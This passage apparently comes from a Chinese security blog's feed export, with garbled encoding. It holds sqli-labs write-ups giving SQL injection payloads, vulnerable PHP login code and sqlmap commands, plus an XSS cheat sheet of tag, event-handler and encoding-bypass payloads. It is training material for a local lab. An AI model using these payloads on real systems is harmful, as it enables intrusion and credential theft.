<p><code>uname=-1&#39; and 1=1 union select @@datadir,version() --    &amp; passwd=admin</code>æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="12-POSTæ³¨å…¥"><a href="#12-POSTæ³¨å…¥" class="headerlink" title="12 POSTæ³¨å…¥"></a>12 POSTæ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;) #</code>é—­åˆ</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="13-POSTå‹å¸ƒå°”ç›²æ³¨"><a href="#13-POSTå‹å¸ƒå°”ç›²æ³¨" class="headerlink" title="13 POSTå‹å¸ƒå°”ç›²æ³¨"></a>13 POSTå‹å¸ƒå°”ç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">	$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">  		</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in &quot; ;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨å¸ƒå°”ç›²æ³¨</p>
<p><code>uname=admin&#39;) and left(database(),1)&gt;&#39;n&#39; # &amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs </code></p>
<h3 id="14POSTæ—¶é—´ç›²æ³¨"><a href="#14POSTæ—¶é—´ç›²æ³¨" class="headerlink" title="14POSTæ—¶é—´ç›²æ³¨"></a>14POSTæ—¶é—´ç›²æ³¨</h3><p><code>&quot;</code>é—­åˆ å’Œ13é¢˜ä¸€æ ·</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-14/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="15-POSTæ—¶é—´-å¸ƒå°”ç›²æ³¨"><a href="#15-POSTæ—¶é—´-å¸ƒå°”ç›²æ³¨" class="headerlink" title="15 POSTæ—¶é—´/å¸ƒå°”ç›²æ³¨"></a>15 POSTæ—¶é—´/å¸ƒå°”ç›²æ³¨</h3><p><code>uname=admin&#39; and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="16POSTæ—¶é—´ç›²æ³¨"><a href="#16POSTæ—¶é—´ç›²æ³¨" class="headerlink" title="16POSTæ—¶é—´ç›²æ³¨"></a>16POSTæ—¶é—´ç›²æ³¨</h3><p><code>uname=admin&quot;) and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-16/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<p><code>python sqlmap.py -r 1.txt --batch --level 3 --dbs</code></p>
<h3 id="17POSTæ˜¾é”™æ³¨å…¥"><a href="#17POSTæ˜¾é”™æ³¨å…¥" class="headerlink" title="17POSTæ˜¾é”™æ³¨å…¥"></a>17POSTæ˜¾é”™æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysql_error</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">]			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åªå¯¹<code>username</code>ä½¿ç”¨<code>check_input()</code>å‡½æ•°è¿›è¡Œè¿‡æ»¤Â·,<code>check_input()</code>ä½œç”¨æ˜¯æˆªå–15ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå¼€å¯äº†GPC,å°±å»æ‰åæ–œæ ï¼Œåœ¨åˆ¤æ–­æ˜¯å¦æ˜¯åè¿›åˆ¶ï¼Œå¦‚æœä¸æ˜¯åè¿›åˆ¶ï¼Œ å°±è½¬è¯‘æ‰ç‰¹æ®Šå­—ç¬¦</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">stripslashes() å‡½æ•°åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</span><br><span class="line">ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</span><br><span class="line">    \x00</span><br><span class="line">    \n</span><br><span class="line">    \r</span><br><span class="line">    \</span><br><span class="line">    &#x27;</span><br><span class="line">    &quot;</span><br><span class="line">    \x1a</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&amp;passwd=123456&#39; #&amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -r 1.txt --batch --dbs</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoæ–‡ç« æ’å…¥å›¾ç‰‡</title>
    <url>/posts/7ecd88c4/</url>
    <content><![CDATA[<h3 id="æœ¬åœ°å¼•ç”¨-é‡‡ç”¨ç›¸å¯¹è·¯å¾„"><a href="#æœ¬åœ°å¼•ç”¨-é‡‡ç”¨ç›¸å¯¹è·¯å¾„" class="headerlink" title="æœ¬åœ°å¼•ç”¨(é‡‡ç”¨ç›¸å¯¹è·¯å¾„)"></a>æœ¬åœ°å¼•ç”¨(é‡‡ç”¨ç›¸å¯¹è·¯å¾„)</h3><p>åœ¨ <code>config.yml</code>æ–‡ä»¶ä¸­é…ç½®ï¼Œpost_asset_folderè®¾ä¸ºtrueï¼Œå½“å†æ¬¡æ–°å»ºæ–‡ç« æ—¶ï¼Œä¼šåœ¨source/_postä¸­ç”Ÿäº§å’Œæ–‡ç« åŒåçš„æ–‡ä»¶å¤¹ï¼ŒæŠŠéœ€è¦çš„å›¾ç‰‡èµ„æºæ”¾å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œå°±å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ¥å¼•ç”¨å›¾ç‰‡.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudyè®¿é—®localhostä¸å‡ºç°ç›®å½•çš„é—®é¢˜</title>
    <url>/posts/2704909e/</url>
    <content><![CDATA[<h4 id="æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€-â€œç½‘ç«™â€â€“-gt-â€ç®¡ç†â€â€“-gt-â€ä¿®æ”¹â€â€“-gt-â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™"><a href="#æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€-â€œç½‘ç«™â€â€“-gt-â€ç®¡ç†â€â€“-gt-â€ä¿®æ”¹â€â€“-gt-â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™" class="headerlink" title="æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€ â€œç½‘ç«™â€â€“&gt;â€ç®¡ç†â€â€“&gt;â€ä¿®æ”¹â€â€“&gt;â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™"></a>æ–°ç‰ˆphpstudyä¸­ï¼Œéœ€è¦åœ¨æ‰“å¼€ â€œç½‘ç«™â€â€“&gt;â€ç®¡ç†â€â€“&gt;â€ä¿®æ”¹â€â€“&gt;â€é«˜çº§é…ç½®â€ä¸‹æ‰“å¼€â€™ç›®å½•ç´¢å¼•â€™</h4><p><img src="/posts/2704909e/phpstudy1.png"></p>
]]></content>
      <categories>
        <category>phpstudy</category>
      </categories>
      <tags>
        <tag>phpstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>XSSæ€»ç»“</title>
    <url>/posts/9f0502f1/</url>
    <content><![CDATA[<h2 id="XSSåˆ†ç±»"><a href="#XSSåˆ†ç±»" class="headerlink" title="XSSåˆ†ç±»"></a>XSSåˆ†ç±»</h2><h3 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h3><p>æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»æœåŠ¡å™¨åå°„ç»™ç”¨æˆ·æµè§ˆå™¨ï¼Œè¦ç²¾å¿ƒæ„é€ payload</p>
<p>æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼ï¼Œè¯±ä½¿ç”¨æˆ·å»è®¿é—®ä¸€ä¸ªåŒ…å«æ¶æ„xssä»£ç çš„ URLï¼Œå½“å—å®³è€…ç‚¹å‡»è¿™äº›ä¸“é—¨è®¾è®¡çš„é“¾æ¥çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šç›´æ¥åœ¨å—å®³è€…ä¸»æœºä¸Šçš„æµè§ˆå™¨æ‰§è¡Œã€‚</p>
<p>æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—ã€‚</p>
<h3 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h3><p>åˆç§°æŒä¹…å‹XSS,å¨èƒè¦æ¯”åå°„å‹XSSè¦å¤§,å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸­.</p>
<p>ç”¨æˆ·ä¸éœ€è¦ç‚¹å‡»ç‰¹å®šçš„urlå°±å¯ä¸æ‰§è¡Œï¼Œæ”»å‡»è€…äº‹å…ˆæŠŠæ¶æ„ä»£ç ä¸Šä¼ æˆ–å­˜å‚¨åˆ°æœåŠ¡å™¨ä¸­ï¼Œå—å®³è€…åªéœ€ç‚¹å¼€è¿™ä¸ªå«æœ‰æ¶æ„ä»£ç çš„é¡µé¢jå°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€äº›ç½‘ä¸Šçš„xsså¹³å°.</p>
<p>æ­¤ç±»XSSå¸¸å‡ºç°åœ¨ç½‘ç«™ç•™è¨€è¯„è®ºç­‰äº¤äº’å¤„.</p>
<br>

<h3 id="DOMå‹"><a href="#DOMå‹" class="headerlink" title="DOMå‹"></a>DOMå‹</h3><p>DOM-Based XSSåŸºäºDOMæ–‡æ¡£å¯¹è±¡çš„ä¸€ç§æ¼æ´ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹XSS.DOMå‹XSSåŸºäºJSä¸Šï¼Œä¸éœ€è¦ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚</p>
<br>

<h2 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h2><h3 id="lt-a-gt-æ ‡ç­¾"><a href="#lt-a-gt-æ ‡ç­¾" class="headerlink" title="&lt;a&gt;æ ‡ç­¾"></a><code>&lt;a&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-img-gt-æ ‡ç­¾"><a href="#lt-img-gt-æ ‡ç­¾" class="headerlink" title="&lt;img&gt;æ ‡ç­¾"></a><code>&lt;img&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-script-gt-æ ‡ç­¾"><a href="#lt-script-gt-æ ‡ç­¾" class="headerlink" title="&lt;script&gt;æ ‡ç­¾"></a><code>&lt;script&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-form-gt-æ ‡ç­¾"><a href="#lt-form-gt-æ ‡ç­¾" class="headerlink" title="&lt;form&gt;æ ‡ç­¾"></a><code>&lt;form&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="lt-iframe-gt-æ ‡ç­¾"><a href="#lt-iframe-gt-æ ‡ç­¾" class="headerlink" title="&lt;iframe&gt;æ ‡ç­¾"></a><code>&lt;iframe&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-svg-gt-æ ‡ç­¾"><a href="#lt-svg-gt-æ ‡ç­¾" class="headerlink" title="&lt;svg&gt;æ ‡ç­¾"></a><code>&lt;svg&gt;æ ‡ç­¾</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨çš„onäº‹ä»¶"><a href="#å¸¸ç”¨çš„onäº‹ä»¶" class="headerlink" title="å¸¸ç”¨çš„onäº‹ä»¶"></a>å¸¸ç”¨çš„onäº‹ä»¶</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onchange 	      #HTML å…ƒç´ æ”¹å˜</span><br><span class="line">onclick 	      #ç”¨æˆ·ç‚¹å‡» HTML å…ƒç´ </span><br><span class="line">onmouseover 	  #ç”¨æˆ·åœ¨ä¸€ä¸ªHTMLå…ƒç´ ä¸Šç§»åŠ¨é¼ æ ‡</span><br><span class="line">onmouseout 	    #ç”¨æˆ·ä»ä¸€ä¸ªHTMLå…ƒç´ ä¸Šç§»å¼€é¼ æ ‡</span><br><span class="line">onkeydown 	    #ç”¨æˆ·æŒ‰ä¸‹é”®ç›˜æŒ‰é”®</span><br><span class="line">onload 	        #æµè§ˆå™¨å·²å®Œæˆé¡µé¢çš„åŠ è½½</span><br><span class="line">onerror         #å‘ç”Ÿé”™è¯¯æ—¶æ‰§è¡Œjs</span><br></pre></td></tr></table></figure>

<h2 id="XSSç»•è¿‡"><a href="#XSSç»•è¿‡" class="headerlink" title="XSSç»•è¿‡"></a>XSSç»•è¿‡</h2><h3 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/**/ , /ç¬¦å· ï¼Œ</span><br></pre></td></tr></table></figure>

<h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><br>

<br>

<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ul>
<li>HTMLå®ä½“ç¼–ç </li>
</ul>
<p>ä»¥<code>&amp;</code>å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œ</p>
<p>å¦‚<code>&lt;</code>çš„ç¼–ç ä¸º<code>&amp;1t;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ä»¥&amp;å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œå¦‚&lt;çš„ç¼–ç ä¸º&amp;1t;</span><br></pre></td></tr></table></figure>

<ul>
<li>URLç¼–ç </li>
</ul>
<p> å¯ä»¥è€ƒè™‘è¿›è¡Œä¸€æ¬¡urlç¼–ç æˆ–è€…äºŒæ¬¡urlç¼–ç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) =&gt; javascript%3Aalert%281%29</span><br><span class="line">alert(&quot;xss&quot;); =&gt; %61%6c%65%72%74%28%22%78%73%73%22%29%3b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Unicodeç¼–ç </li>
</ul>
